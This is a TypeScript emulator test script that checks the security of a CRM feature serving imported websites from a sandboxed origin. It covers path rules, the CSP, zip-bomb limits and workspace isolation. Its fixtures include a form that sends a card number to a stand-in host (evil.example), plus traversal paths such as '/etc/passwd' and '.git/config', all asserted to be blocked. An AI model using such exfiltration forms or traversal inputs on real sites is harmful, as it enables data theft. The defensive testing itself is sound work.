/**
 * Pages & Funnels — imported websites (2026-11-20): interactive HTML + JS +
 * CSS + assets served ONLY from the separate content origin. Pure policy
 * checks + Firestore / Storage EMULATOR checks (upload, isolation, serving,
 * host check, page lifecycle). No network, no production credentials.
 *
 * Run (from the repo root):
 *   echo '{"emulators":{"firestore":{"port":8089},"auth":{"port":9189},"storage":{"port":9289},"hub":{"port":4420},"logging":{"port":4520}},"storage":{"rules":"storage.rules"}}' > firebase.sites-test.json
 *   firebase emulators:exec --config firebase.sites-test.json --only firestore,auth,storage --project demo-imported-sites \
 *     "NODE_OPTIONS='--require ./scripts/_server-only-shim.cjs' pnpm exec tsx --tsconfig ./tsconfig.json scripts/check-imported-sites.ts"
 */
import assert from "node:assert/strict";
import { initializeApp } from "firebase-admin/app";
import { zipSync, strToU8 } from "fflate";

const PROJECT = process.env.GCLOUD_PROJECT ?? "";
if (!process.env.FIRESTORE_EMULATOR_HOST || !process.env.FIREBASE_STORAGE_EMULATOR_HOST || !PROJECT.startsWith("demo-") || process.env.FIREBASE_ADMIN_PRIVATE_KEY || process.env.GOOGLE_APPLICATION_CREDENTIALS) {
  console.error("Refusing to run: Firestore + Storage emulators and a demo-* project only, no production credentials.");
  process.exit(1);
}
process.env.FIREBASE_ADMIN_PROJECT_ID ??= PROJECT;
process.env.NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET = `${PROJECT}.appspot.com`;
process.env.NEXT_PUBLIC_APP_URL = "https://crm.magnetixstudios.com";
process.env.NEXT_PUBLIC_IMPORTED_CONTENT_ORIGIN = "https://magnetix-sites.example";
for (const k of ["RESEND_API_KEY", "QSTASH_TOKEN", "QSTASH_URL", "STRIPE_SECRET_KEY"]) delete process.env[k];

let passed = 0;
let failed = 0;
async function check(name: string, fn: () => Promise<void> | void) {
  try {
    await fn();
    passed++;
    console.log(`  ok  ${name}`);
  } catch (err) {
    failed++;
    console.log(`  FAIL ${name}\n       ${(err as Error).stack?.split("\n").slice(0, 3).join("\n       ")}`);
  }
}

const SITE_HTML = `<!doctype html><html><head><meta charset="utf-8"><link rel="stylesheet" href="css/style.css"><script src="js/app.js" defer></script></head>
<body><nav><button id="menu">Menu</button><ul id="links" hidden><li><a href="about.html">About</a></li><li><a href="#pricing">Pricing</a></li></ul></nav>
<section id="pricing"><img src="img/hero.png" alt=""><img src="img/missing.png" alt=""></section>
<form data-magnetix-form="formOK"><input name="email" type="email" required><button>Join</button></form>
<form data-magnetix-form="formOTHER"><input name="email"></form>
<form action="https://evil.example/collect"><input name="card"></form></body></html>`;

async function main() {
  const pol = await import("../src/lib/pages-funnels/imported-site/policy");
  const cli = await import("../src/lib/pages-funnels/imported-site/client");

  console.log("A. Policy (pure)");
  await check("unsafe paths refused: traversal, absolute, drive letters, backslash tricks, hidden / OS files, control chars", () => {
    for (const bad of ["../x.html", "a/../../x", "/etc/passwd", "C:/win.ini", "..\\\\x.js", "a/.env", ".git/config", "__MACOSX/a.png", "a\u0000b.html", "a/b/c/d/e/f/g/h/i/x.css", "a b/<x>.js"]) assert.equal(pol.normalizeSitePath(bad), null, bad);
    assert.equal(pol.normalizeSitePath("./css//style.css"), "css/style.css");
    assert.equal(pol.normalizeSitePath("img\\\\hero.png"), "img/hero.png");
  });
  await check("file types: web files allowed; executables / server code / archives refused", () => {
    for (const ok of ["index.html", "a.css", "b.js", "c.mjs", "d.woff2", "e.svg", "f.webp", "g.mp4"]) assert.ok(pol.isAllowedSiteFile(ok), ok);
    for (const bad of ["x.php", "x.exe", "x.sh", "x.zip", "x.wasm", "x.py", "server.ts", "x.htaccess", "x"]) assert.ok(!pol.isAllowedSiteFile(bad), bad);
  });
  await check("entry page + shared top folder", () => {
    assert.equal(pol.pickEntry(["index.html", "about.html"]), "index.html");
    assert.equal(pol.pickEntry(["landing.html", "css/a.css"]), "landing.html");
    assert.equal(pol.pickEntry(["a.html", "b.html"]), null);
    const strip = pol.stripCommonRoot(["site/index.html", "site/css/a.css"]);
    assert.equal(strip("site/css/a.css"), "css/a.css");
  });
  await check("content origin: OFF when unset; refused when same SITE as the app (sibling subdomain); separate site allowed", () => {
    assert.equal(pol.importedContentOrigin({ content: "", app: "https://crm.magnetixstudios.com" }), null);
    assert.equal(pol.importedContentOrigin({ content: "https://sites.magnetixstudios.com", app: "https://crm.magnetixstudios.com" }), null);
    assert.equal(pol.importedContentOrigin({ content: "https://crm.magnetixstudios.com", app: "https://crm.magnetixstudios.com" }), null);
    assert.equal(pol.importedContentOrigin({ content: "http://sites.example.com", app: "https://crm.magnetixstudios.com" }), null, "https only (except local)");
    assert.equal(pol.importedContentOrigin({ content: "https://magnetixsites.com", app: "https://crm.magnetixstudios.com" }), "https://magnetixsites.com");
    assert.equal(pol.importedContentOrigin({ content: "https://magnetix-studios-content.vercel.app", app: "https://crm.magnetixstudios.com" }), "https://magnetix-studios-content.vercel.app");
    assert.equal(pol.importedContentOrigin({ content: "http://127.0.0.1:3310", app: "http://localhost:3310" }), "http://127.0.0.1:3310");
  });
  await check("served CSP: opaque sandbox (no allow-same-origin), no form submissions, network only to the content origin", () => {
    const csp = pol.siteResponseCsp("https://magnetixsites.com");
    assert.match(csp, /^sandbox allow-scripts/);
    assert.ok(!/allow-same-origin/.test(csp));
    assert.match(csp, /form-action 'none'/);
    assert.match(csp, /connect-src https:\/\/magnetixsites\.com(;|$)/);
    assert.match(csp, /base-uri 'none'/);
    assert.match(csp, /object-src 'none'/);
    assert.ok(!/allow-same-origin/.test(pol.siteSandbox("visitor")) && !/allow-same-origin/.test(pol.siteSandbox("editing")));
    assert.ok(!/allow-forms|allow-top-navigation/.test(pol.siteSandbox("editing")), "editor: no navigation, no forms");
  });
  await check("shim injected first in <head>; forms held unless connected; links to other sites open the page", () => {
    const out = pol.injectSiteShim("<html><head><title>x</title></head><body></body></html>");
    assert.ok(out.indexOf("<script>") < out.indexOf("<title>"));
    assert.match(pol.SITE_SHIM_SCRIPT, /data-magnetix-form/);
    assert.match(pol.SITE_SHIM_SCRIPT, /not-connected/);
    assert.match(pol.SITE_SHIM_SCRIPT, /_top/);
  });
  await check("missing references found (relative + http); present files and anchors are fine; connected form ids read", () => {
    const missing = pol.findUnresolvedSiteRefs({ "index.html": SITE_HTML, "css/style.css": "body{background:url(../img/bg.jpg)}", "js/app.js": "", "img/hero.png": "", "about.html": "" });
    assert.deepEqual(missing.sort(), ["../img/bg.jpg", "img/missing.png"].sort());
    assert.deepEqual(pol.connectedFormIds(SITE_HTML).sort(), ["formOK", "formOTHER"]);
  });
  await check("zip: traversal entries skipped; decompression bomb refused", () => {
    const zip = zipSync({ "site/index.html": strToU8("<h1>x</h1>"), "../evil.html": strToU8("x"), "site/run.php": strToU8("<?php"), "site/css/a.css": strToU8("a{}") });
    const prepared = cli.prepareSite(cli.readZip(zip.buffer as ArrayBuffer));
    assert.deepEqual(prepared.files.map((f) => f.path).sort(), ["css/a.css", "index.html"]);
    assert.equal(prepared.entry, "index.html");
    assert.ok(prepared.skipped.some((s) => /run\.php/.test(s)));
    const bomb = zipSync({ "index.html": new Uint8Array(2_500_000), "a.css": new Uint8Array(2_500_000), "b.css": new Uint8Array(2_500_000), "c.css": new Uint8Array(2_500_000), "d.css": new Uint8Array(2_500_000), "e.css": new Uint8Array(2_500_000), "f.css": new Uint8Array(2_500_000), "g.css": new Uint8Array(2_500_000), "h.css": new Uint8Array(2_500_000) }, { level: 9 });
    assert.ok(bomb.length < 200_000, "highly compressed");
    assert.throws(() => cli.readZip(bomb.buffer as ArrayBuffer), /too large/);
  });

  console.log("B. Bundles + serving (emulator)");
  initializeApp({ projectId: PROJECT, storageBucket: `${PROJECT}.appspot.com` });
  const { getAdminDb } = await import("../src/lib/firebase/admin");
  const svc = await import("../src/lib/server/pages-funnels/imported-site-service");
  const route = await import("../src/app/imported/[...path]/route");
  const puck = await import("../src/lib/server/pages-funnels-puck-service");
  const storage = await import("../src/lib/pages-funnels/puck-storage");
  const versions = await import("../src/lib/server/pages-funnels/page-version-service");
  const db = getAdminDb();
  const SA = "sa_sites";
  const SA2 = "sa_sites_other";
  await db.doc(`subAccounts/${SA}`).set({ name: "Sites", agencyId: "ag1", createdByUid: "u1" });
  await db.doc(`subAccounts/${SA2}`).set({ name: "Other", agencyId: "ag2", createdByUid: "u2" });
  await db.doc("forms/formOK").set({ subAccountId: SA, agencyId: "ag1", name: "Join", fields: [], enabled: true });
  await db.doc("forms/formOTHER").set({ subAccountId: SA2, agencyId: "ag2", name: "Other", fields: [], enabled: true });
  const b64 = (s: string) => Buffer.from(s, "utf8").toString("base64");
  let bundleId = "";

  await check("upload: files stored for this workspace; finish finds index.html, scripts, missing files; only this workspace's forms connect", async () => {
    bundleId = (await svc.startSiteBundle({ subAccountId: SA, uid: "u1" })).bundleId;
    for (const [p, t] of Object.entries({ "index.html": SITE_HTML, "css/style.css": "nav{display:flex}", "js/app.js": "document.getElementById('menu').onclick=()=>{document.getElementById('links').hidden=false}", "img/hero.png": "png", "about.html": "<h1>About</h1>" })) {
      await svc.addSiteFile({ subAccountId: SA, uid: "u1", bundleId, path: p, base64: b64(t) });
    }
    const r = await svc.finishSiteBundle({ subAccountId: SA, uid: "u1", bundleId });
    assert.equal(r.ref.entry, "index.html");
    assert.equal(r.ref.fileCount, 5);
    assert.ok(r.ref.scripts >= 2);
    assert.deepEqual(r.ref.forms, ["formOK"], JSON.stringify(r));
    assert.deepEqual(r.invalidForms, ["formOTHER"], "another workspace's form never connects");
    assert.deepEqual(r.missing, ["img/missing.png"], JSON.stringify(r.missing));
  });
  await check("upload refusals: unsafe path, bad type, duplicates, after finish, other workspace, other user", async () => {
    const b = (await svc.startSiteBundle({ subAccountId: SA, uid: "u1" })).bundleId;
    await assert.rejects(svc.addSiteFile({ subAccountId: SA, uid: "u1", bundleId: b, path: "../x.html", base64: b64("x") }), /isn't allowed/);
    await assert.rejects(svc.addSiteFile({ subAccountId: SA, uid: "u1", bundleId: b, path: "x.php", base64: b64("x") }), /supported/);
    await svc.addSiteFile({ subAccountId: SA, uid: "u1", bundleId: b, path: "index.html", base64: b64("<p>x</p>") });
    await assert.rejects(svc.addSiteFile({ subAccountId: SA, uid: "u1", bundleId: b, path: "INDEX.html", base64: b64("x") }), /already/);
    await assert.rejects(svc.addSiteFile({ subAccountId: SA2, uid: "u2", bundleId: b, path: "a.css", base64: b64("x") }), /not found/);
    await assert.rejects(svc.addSiteFile({ subAccountId: SA, uid: "intruder", bundleId: b, path: "a.css", base64: b64("x") }), /finished/);
    await svc.finishSiteBundle({ subAccountId: SA, uid: "u1", bundleId: b });
    await assert.rejects(svc.addSiteFile({ subAccountId: SA, uid: "u1", bundleId: b, path: "late.css", base64: b64("x") }), /finished/);
    await assert.rejects(svc.addSiteFile({ subAccountId: SA, uid: "u1", bundleId: (await svc.startSiteBundle({ subAccountId: SA, uid: "u1" })).bundleId, path: "big.js", base64: Buffer.alloc(3_100_000).toString("base64") }), /larger/);
  });
  await check("content route: serves listed files with the sandbox CSP ONLY on the content origin; 404 on the app domain / spoofed host / unknown paths", async () => {
    const get = (url: string, headers: Record<string, string>) => route.GET(new Request(url, { headers }), { params: Promise.resolve({ path: url.split("/imported/")[1].split("/") }) });
    const ok = await get(`https://magnetix-sites.example/imported/${bundleId}/index.html`, { host: "magnetix-sites.example" });
    assert.equal(ok.status, 200);
    assert.match(ok.headers.get("content-security-policy")!, /^sandbox allow-scripts/);
    assert.equal(ok.headers.get("x-content-type-options"), "nosniff");
    const body = await ok.text();
    assert.ok(body.indexOf("data-magnetix-form") < body.indexOf("<link"), "shim first");
    assert.equal((await get(`https://crm.magnetixstudios.com/imported/${bundleId}/index.html`, { host: "crm.magnetixstudios.com" })).status, 404, "never on the app origin");
    assert.equal((await get(`https://crm.magnetixstudios.com/imported/${bundleId}/index.html`, { host: "crm.magnetixstudios.com", "x-forwarded-host": "magnetix-sites.example" })).status, 404, "spoofed forwarded host");
    assert.equal((await get(`https://magnetix-sites.example/imported/${bundleId}/../../etc/passwd`, { host: "magnetix-sites.example" })).status, 404);
    assert.equal((await get(`https://magnetix-sites.example/imported/${bundleId}/secret.txt`, { host: "magnetix-sites.example" })).status, 404, "only listed files");
    const css = await get(`https://magnetix-sites.example/imported/${bundleId}/css/style.css`, { host: "magnetix-sites.example" });
    assert.equal(css.headers.get("content-type"), "text/css; charset=utf-8");
    process.env.NEXT_PUBLIC_IMPORTED_CONTENT_ORIGIN = "";
    try {
      assert.equal((await get(`https://magnetix-sites.example/imported/${bundleId}/index.html`, { host: "magnetix-sites.example" })).status, 404, "feature off → nothing served");
    } finally {
      process.env.NEXT_PUBLIC_IMPORTED_CONTENT_ORIGIN = "https://magnetix-sites.example";
    }
  });
  let pageId = "";
  await check("page from a website: full-bleed Custom HTML block with the site + a static fallback; another workspace's bundle refused", async () => {
    await assert.rejects(Promise.resolve(puck.createPuckPage({ subAccountId: SA2, uid: "u2", name: "Steal", pageType: "landing", goal: "lead_generation", importSiteBundleId: bundleId })).then((r) => (r.ok ? Promise.resolve() : Promise.reject(new Error(r.error)))));
    const r = await puck.createPuckPage({ subAccountId: SA, uid: "u1", name: "Imported site", pageType: "landing", goal: "lead_generation", importSiteBundleId: bundleId });
    assert.ok(r.ok, JSON.stringify(r));
    pageId = (r as { pageId: string }).pageId;
    const data = storage.readStoredPuckData((await db.doc(`pages/${pageId}`).get()).get("puckDraftData"))!;
    const section = data.content[0] as { props: { maxWidth: string; rows: { props: { columns: { props: { elements: { type: string; props: { content: { site: { bundleId: string }; html: string } } }[] } }[] } }[] } };
    assert.equal(section.props.maxWidth, "bleed");
    const block = section.props.rows[0].props.columns[0].props.elements[0];
    assert.equal(block.type, "CustomHtml");
    assert.equal(block.props.content.site.bundleId, bundleId);
    assert.ok(!/<script/i.test(block.props.content.html), "static fallback is sanitized");
  });
  await check("edit the page HTML → a NEW bundle (old one kept for Version History); save, publish, duplicate keep the site", async () => {
    const edited = await svc.editSiteEntry({ subAccountId: SA, uid: "u1", bundleId, html: SITE_HTML.replace("Menu", "Open menu") });
    assert.notEqual(edited.ref.bundleId, bundleId);
    assert.equal(edited.ref.fileCount, 5);
    assert.ok((await svc.readServableSiteFile(bundleId, "index.html")), "old bundle still served");
    assert.match((await svc.readServableSiteFile(edited.ref.bundleId, "index.html"))!.bytes.toString(), /Open menu/);
    assert.ok(await svc.readServableSiteFile(edited.ref.bundleId, "img/hero.png"), "assets copied");
    const data = storage.readStoredPuckData((await db.doc(`pages/${pageId}`).get()).get("puckDraftData"))!;
    const block = (data.content[0] as { props: { rows: { props: { columns: { props: { elements: { props: { content: Record<string, unknown> } }[] } }[] } }[] } }).props.rows[0].props.columns[0].props.elements[0];
    block.props.content = { ...block.props.content, site: edited.ref };
    assert.ok((await puck.savePuckDraft(SA, pageId, data, {}, { actor: { uid: "u1", name: "QA" } })).ok);
    assert.ok((await puck.publishPuckPage(SA, pageId, data, {}, { actor: { uid: "u1", name: "QA" } })).ok);
    const live = JSON.stringify(storage.readStoredPuckData((await db.doc(`pages/${pageId}`).get()).get("puckPublishedData")));
    assert.match(live, new RegExp(edited.ref.bundleId));
    const list = await versions.listPageVersions(SA, pageId);
    assert.ok(list.ok && list.versions.length >= 1);
    const dup = await puck.duplicatePuckPage(SA, pageId, "u1");
    assert.ok(dup.ok);
    assert.match(JSON.stringify(storage.readStoredPuckData((await db.doc(`pages/${(dup as { pageId: string }).pageId}`).get()).get("puckDraftData"))), new RegExp(edited.ref.bundleId));
  });
  await check("a page create from a site is refused when interactive imports are off", async () => {
    process.env.NEXT_PUBLIC_IMPORTED_CONTENT_ORIGIN = "";
    try {
      const r = await puck.createPuckPage({ subAccountId: SA, uid: "u1", name: "Off", pageType: "landing", goal: "lead_generation", importSiteBundleId: bundleId });
      assert.equal(r.ok, false);
    } finally {
      process.env.NEXT_PUBLIC_IMPORTED_CONTENT_ORIGIN = "https://magnetix-sites.example";
    }
  });

  console.log(`\n${passed} passed, ${failed} failed`);
  process.exit(failed ? 1 : 0);
}
main().catch((e) => {
  console.error(e);
  process.exit(1);
});
